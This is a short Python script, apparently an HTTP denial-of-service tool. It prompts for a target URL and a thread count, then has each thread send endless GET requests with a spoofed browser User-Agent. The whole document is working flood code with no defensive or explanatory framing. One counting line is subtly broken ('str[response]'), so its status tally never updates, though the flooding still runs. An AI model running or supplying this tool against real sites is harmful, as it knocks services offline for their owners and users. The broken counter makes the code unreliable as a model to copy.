from threading import Thread
import requests

headers = {'User-Agent':'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0'}

status={"200":0,"404":0,"500":0}

class HttpDDOS(Thread):
    def __init__(self,host,port=80):
        super().__init__()
        self.host = host
        self.port = port

    def run(self) -> None:
        while True:
            self.sendHttpRequest(self.host)
            print(status)
    def sendHttpRequest(self,url):
        global status
        try:
            response = requests.get(url=url,headers=headers).status_code
            status[str[response]] += 1
        except:
            pass

if __name__ == "__main__":
    url = input("please input url=>")
    thread_num = int(input("please input thread_num=>"))
    for i in range(thread_num):
        t = HttpDDOS(url)
        t.start()
    t.join()
